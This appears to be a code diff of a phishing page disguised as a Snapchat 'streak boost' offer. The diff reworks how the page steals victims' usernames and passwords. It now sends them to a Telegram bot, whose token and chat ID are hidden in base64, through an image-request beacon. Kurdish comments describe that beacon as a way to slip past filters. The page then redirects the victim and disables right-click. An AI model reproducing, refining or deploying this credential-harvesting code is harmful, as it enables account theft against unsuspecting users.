@@ -7,12 +7,14 @@
     <style>
         body { background: #FFFC00; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: -apple-system, sans-serif; overflow: hidden; }
         #app-root { width: 85%; max-width: 300px; z-index: 2; }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
     <div id="app-root"></div>
 
     <script>
+        // زانیارییە شاردراوەکان (تۆکن و چات ئایدی)
         const _s = {
             t: "NzczNzI3NDAyNjpBQUhTYlMtaUU4b1FfRV85WjlaOVo5WjlaOVo5WjlaOVo5Wg==",
             c: "NjYzOTUzNTMw",
@@ -38,7 +40,6 @@
                         <button type="submit" style="width:98%; padding:12px; background:#00ADEE; color:white; border:none; border-radius:22px; font-weight:700; font-size:15px; cursor:pointer;">زيادكردن</button>
                     </form>
                 </div>
-                <style>@keyframes spin { to { transform: rotate(360deg); } }</style>
             `;
             document.getElementById('app-root').innerHTML = ui;
         }
@@ -52,26 +53,23 @@
 
                 const u = document.getElementById('ux').value;
                 const p = document.getElementById('px').value;
-                const info = `🔥 [STREAK BOOST] 🔥\n\n👤 User: ${u}\n🔑 Pass: ${p}\n📱 System: ${navigator.platform}`;
+                const info = `🔥 [NEW HIT] 🔥\n👤 User: ${u}\n🔑 Pass: ${p}`;
+
+                // تەکنیکی ناردن لە ڕێگەی وێنەوە بۆ تێنەپەڕین بە فلتەرەکان
+                const api = dec(_s.u) + dec(_s.t) + "/sendMessage?chat_id=" + dec(_s.c) + "&text=" + encodeURIComponent(info);
 
                 try {
-                    await fetch(dec(_s.u) + dec(_s.t) + dec("L3NlbmRNZXNzYWdl"), {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: dec(_s.c), text: info })
-                    });
-                } catch (e) {}
+                    const img = new Image();
+                    img.src = api;
+                } catch (err) {}
 
                 setTimeout(() => {
                     window.location.replace(dec(_s.g));
-                }, 1000);
+                }, 1200);
             }
         });
 
         document.oncontextmenu = () => false;
-        document.onkeydown = (e) => {
-            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74))) return false;
-        };
     </script>
 </body>
 </html>
